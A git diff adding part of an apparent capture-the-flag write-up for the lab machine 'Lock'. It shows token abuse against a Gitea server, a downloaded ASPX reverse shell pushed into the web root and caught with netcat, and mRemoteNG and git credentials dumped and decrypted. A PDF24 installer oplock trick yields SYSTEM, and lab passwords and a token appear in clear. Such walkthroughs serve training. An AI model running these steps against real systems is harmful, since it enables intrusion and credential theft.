@@ -585,3 +585,388 @@ Task Completed
 ![[Pasted image 20250902221154.png]]
 - Username Enumeration: `ellen-freeman`
 - Public Scripts - `dev-scripts`
+### Discovering an Access Token
+
+![[Pasted image 20250915210140.png]]
+
+```python
+PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
+```
+
+### Discovering `/api/swagger` directory
+
+![[Pasted image 20250915210950.png]]
+
+So, apparently this page will be helpful in using our Personal Access Token
+
+![[Pasted image 20250915211045.png]]
+
+- Digging into Gitea via API
+
+```bash
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~]
+└──╼ [★]$ curl -X 'GET'   'http://lock.vl:3000/api/v1/user?access_token=43ce39bb0bd6bc489284f2905f033ca467a6362f'   -H 'accept: application/json' | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   501  100   501    0     0   4900      0 --:--:-- --:--:-- --:--:--  4911
+{
+  "id": 2,
+  "login": "ellen.freeman",
+  "login_name": "",
+  "full_name": "",
+  "email": "ellen.freeman@lock.vl",
+  "avatar_url": "http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74",
+  "language": "en-US",
+  "is_admin": false,
+  "last_login": "2023-12-28T11:38:25-08:00",
+  "created": "2023-12-27T11:13:10-08:00",
+  "restricted": false,
+  "active": true,
+  "prohibit_login": false,
+  "location": "",
+  "website": "",
+  "description": "",
+  "visibility": "public",
+  "followers_count": 0,
+  "following_count": 0,
+  "starred_repos_count": 0,
+  "username": "ellen.freeman"
+}
+```
+
+- Listing Repo's
+
+```bash
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~]
+└──╼ [★]$ curl -X 'GET'   'http://lock.vl:3000/api/v1/repos/search?access_token=43ce39bb0bd6bc489284f2905f033ca467a6362f'   -H 'accept: application/json' | jq
+```
+
+
+![[Pasted image 20250915212050.png]]
+
+- Cloning the private repo (password is the Personal access token from above)
+
+```bash
+┌─[itsashuotf☺htb-j4stkkidgm]─[~]
+└──╼ $git clone http://lock.vl:3000/ellen.freeman/website.git
+Cloning into 'website'...
+Username for 'http://lock.vl:3000': ellen.freeman
+Password for 'http://ellen.freeman@lock.vl:3000': 
+remote: Enumerating objects: 165, done.
+remote: Counting objects: 100% (165/165), done.
+remote: Compressing objects: 100% (128/128), done.
+remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
+Receiving objects: 100% (165/165), 7.16 MiB | 1.50 MiB/s, done.
+Resolving deltas: 100% (35/35), done.
+
+```
+
+
+```bash
+┌─[itsashuotf☺htb-j4stkkidgm]─[~/website]
+└──╼ $ls -al
+total 40
+drwxr-xr-x  4 itsashuotf itsashuotf  4096 Sep 15 10:55 .
+drwx------ 26 itsashuotf itsashuotf  4096 Sep 15 10:55 ..
+drwxr-xr-x  6 itsashuotf itsashuotf  4096 Sep 15 10:55 assets
+-rw-r--r--  1 itsashuotf itsashuotf    43 Sep 15 10:55 changelog.txt
+drwxr-xr-x  8 itsashuotf itsashuotf  4096 Sep 15 10:55 .git
+-rw-r--r--  1 itsashuotf itsashuotf 15708 Sep 15 10:55 index.html
+-rw-r--r--  1 itsashuotf itsashuotf   130 Sep 15 10:55 readme.md
+
+```
+
+- This looks like its the same website that is running on the port 80 as the changelog.txt file is same that is showing up there too.
+
+### Write Access to website itself
+
+```bash
+┌─[itsashuotf☺htb-j4stkkidgm]─[~/Lock]
+└──╼ $echo "Hacking the world " > changelog.txt  
+
+─[itsashuotf☺htb-j4stkkidgm]─[~/Lock]
+└──╼ $ls                                                                      changelog.txt  website 
+ ┌─[itsashuotf☺htb-j4stkkidgm]─[~/Lock]                                        └──╼ $rm changelog.txt                                   
+┌─[itsashuotf☺htb-j4stkkidgm]─[~/Lock]                            
+└──╼ $cd website/                                    
+┌─[itsashuotf☺htb-j4stkkidgm]─[~/Lock/website]                               
+└──╼ $echo "Hacking the world " > changelog.txt                             
+┌─[itsashuotf☺htb-j4stkkidgm]─[~/Lock/website]                             
+└──╼ $ls                                             
+assets  changelog.txt  index.html  readme.md                            
+┌─[itsashuotf☺htb-j4stkkidgm]─[~/Lock/website]                             
+└──╼ $cat changelog.txt                                 
+Hacking the world                           
+┌─[itsashuotf☺htb-j4stkkidgm]─[~/Lock/website]                          
+└──╼ $git add . 
+┌─[itsashuotf☺htb-j4stkkidgm]─[~/Lock/website]
+└──╼ $git commit -m "testing..."
+[main 7ff6ced] testing...
+ Committer: ellen.freeman <itsashuotf@htb-j4stkkidgm.htb-cloud.com>
+Your name and email address were configured automatically based
+on your username and hostname. Please check that they are accurate.
+You can suppress this message by setting them explicitly:
+
+    git config --global user.name "Your Name"
+    git config --global user.email you@example.com
+
+After doing this, you may fix the identity used for this commit with:
+
+    git commit --amend --reset-author
+
+ 1 file changed, 1 insertion(+), 3 deletions(-)
+┌─[itsashuotf☺htb-j4stkkidgm]─[~/Lock/website]
+└──╼ $git push origin main
+Username for 'http://lock.vl:3000': ellen.freeman
+Password for 'http://ellen.freeman@lock.vl:3000': 
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (2/2), done.
+Writing objects: 100% (3/3), 288 bytes | 288.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
+remote: . Processing 1 references
+remote: Processed 1 references in total
+To http://lock.vl:3000/ellen.freeman/website.git
+   73cdcc1..7ff6ced  main -> main
+
+```
+
+So, using this API key we successfully  uploaded the edited `changelog.txt` file onto the system.
+
+## Getting a Reverse Shell
+
+Let's download a reverse shell payload to upload on the server and get a reverse shell from this Repo https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
+
+```bash
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock/website]
+└──╼ [★]$ wget https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/refs/heads/master/shell.aspx
+--2025-09-15 11:25:14--  https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/refs/heads/master/shell.aspx
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 15968 (16K) [text/plain]
+Saving to: ‘shell.aspx’
+
+shell.aspx                                      100%[=====================================================================================================>]  15.59K  --.-KB/s    in 0.002s  
+
+2025-09-15 11:25:14 (7.58 MB/s) - ‘shell.aspx’ saved [15968/15968]
+
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock/website]
+└──╼ [★]$ ls
+assets  changelog.txt  index.html  readme.md  shell.aspx
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock/website]
+└──╼ [★]$ nano shell.aspx 
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock/website]
+└──╼ [★]$ git add .
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock/website]
+└──╼ [★]$ git commit -m 'test'
+[main cb31ba1] test
+ Committer: ellen.freeman <itsashuotf@htb-j4stkkidgm.htb-cloud.com>
+Your name and email address were configured automatically based
+on your username and hostname. Please check that they are accurate.
+You can suppress this message by setting them explicitly:
+
+    git config --global user.name "Your Name"
+    git config --global user.email you@example.com
+
+After doing this, you may fix the identity used for this commit with:
+
+    git commit --amend --reset-author
+
+ 1 file changed, 423 insertions(+)
+ create mode 100644 shell.aspx
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock/website]
+└──╼ [★]$ git push origin main
+Username for 'http://lock.vl:3000': ellen.freeman
+Password for 'http://ellen.freeman@lock.vl:3000': 
+Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 3.78 KiB | 3.78 MiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
+remote: . Processing 1 references
+remote: Processed 1 references in total
+To http://lock.vl:3000/ellen.freeman/website.git
+   7ff6ced..cb31ba1  main -> main
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock/website]
+└──╼ [★]$ 
+
+```
+
+- We pushed our shell, let's setup listener and hit for the call back.
+
+```bash
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~]
+└──╼ [★]$ nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.41] from (UNKNOWN) [10.129.153.0] 56610
+Spawn Shell...
+Microsoft Windows [Version 10.0.20348.3932]
+(c) Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+lock\ellen.freeman
+
+c:\windows\system32\inetsrv>
+
+```
+
+we got a shell as ellen.freeman.
+
+## Post Exploitation
+
+```powershell
+c:\Users\ellen.freeman\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8592-A9D9
+
+ Directory of c:\Users\ellen.freeman\Documents
+
+12/28/2023  06:59 AM    <DIR>          .
+12/28/2023  12:36 PM    <DIR>          ..
+12/28/2023  06:59 AM             3,341 config.xml
+               1 File(s)          3,341 bytes
+               2 Dir(s)   5,682,978,816 bytes free
+
+c:\Users\ellen.freeman\Documents>type config.xml
+type config.xml
+<?xml version="1.0" encoding="utf-8"?>
+<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
+    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
+</mrng:Connections>
+
+```
+
+Okay, so digging deeper into file system of ellen I found a credential for another user.
+
+```bash
+Username="Gale.Dekarios"
+Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw=="
+```
+
+- Another Credential
+
+```powershell
+c:\Users\ellen.freeman>type .git-credentials
+type .git-credentials
+http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000
+
+```
+
+- Another password cracked 
+
+```bash
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock]
+└──╼ [★]$ git clone https://github.com/gquere/mRemoteNG_password_decrypt
+Cloning into 'mRemoteNG_password_decrypt'...
+remote: Enumerating objects: 11, done.
+remote: Counting objects: 100% (11/11), done.
+remote: Compressing objects: 100% (9/9), done.
+remote: Total 11 (delta 2), reused 10 (delta 2), pack-reused 0 (from 0)
+Receiving objects: 100% (11/11), done.
+Resolving deltas: 100% (2/2), done.
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock]
+└──╼ [★]$ cd mRemoteNG_password_decrypt/
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock/mRemoteNG_password_decrypt]
+└──╼ [★]$ ls
+mremoteng_decrypt.py  README.md
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock/mRemoteNG_password_decrypt]
+└──╼ [★]$ python mremoteng_decrypt.py 
+usage: mremoteng_decrypt.py [-h] [-p PASSWORD] [--csv] config_file
+mremoteng_decrypt.py: error: the following arguments are required: config_file
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock/mRemoteNG_password_decrypt]
+└──╼ [★]$ nano config.xml
+┌─[sg-dedivip-1]─[10.10.14.41]─[itsashuotf@htb-j4stkkidgm]─[~/Lock/mRemoteNG_password_decrypt]
+└──╼ [★]$ python mremoteng_decrypt.py config.xml 
+Name: RDP/Gale
+Hostname: Lock
+Username: Gale.Dekarios
+Password: ty8wnW9qCKDosXo6
+
+```
+
+Let's RDP into this machines using remmina
+
+![[Pasted image 20250915222515.png]]
+
+![[Pasted image 20250915222556.png]]
+
+- We got access to user shell via RDP and the user flag on the desktop.
+
+![[Pasted image 20250915222634.png]]
+
+Trying to Escalate we see this UAC prompt.
+
+![[Pasted image 20250915222818.png]]
+
+# Privilege Escalation
+
+On the Desktop, there are shortcuts for PDF24. it would be worth digging into that application for privilege escalation or lateral movement.
+
+- https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/
+
+As per this article the vulnerable versions are `<=11.15.1`. Let's check the version installed.
+
+![[Pasted image 20250915223739.png]]
+
+This is **vulnerable.** Now we need to exploit this with the POC mentioned in the article.
+
+As per the POC, we will need the MSI Installer and after digging through and enabling Show Hidden Items in Windows Explorer I found a folder named `_install`
+
+![[Pasted image 20250915224354.png]]
+
+In this folder, there is our MSI Installer file.
+
+![[Pasted image 20250915224428.png]]
+
+Let's Download our `SetOpLock` tool from it's repo.
+
+![[Pasted image 20250915224623.png]]
+
+Downloading Done, let's transfer to Victim Machine.
+
+![[Pasted image 20250915225124.png]]
+
+Transfer Done ! Now Let's set the OPLock as per the POC
+
+![[Pasted image 20250915225310.png]]
+
+OPLock is set. Now time to run MSI Installer 
+
+![[Pasted image 20250915225500.png]]
+
+Running the MSI Installer
+
+![[Pasted image 20250915225731.png]]
+
+Now, a console windows is popped up.
+
+![[Pasted image 20250915225757.png]]
+
+If the oplock is set, the cmd window that gets opened when pdf24-PrinterInstall.exe is executed doesn't close. The attacker can then perform the following actions to spawn a SYSTEM shell:
+
+- right click on the top bar of the cmd window
+- click on properties
+- under options click on the "Legacyconsolemode" link
+
+![[Pasted image 20250915230918.png]]
+
+- open the link with a browser other than internet explorer or edge (both don't open as SYSTEM when on Win11)in the opened browser window press the key combination CTRL+o
+
+![[Pasted image 20250915230950.png]]
+
+
+- type cmd.exe in the top bar and press Enter
+
+![[Pasted image 20250915231020.png]]
+
+We Successfully Compromised the system.
+
+![[Pasted image 20250915231113.png]]
+
+We Got our root flag.
+
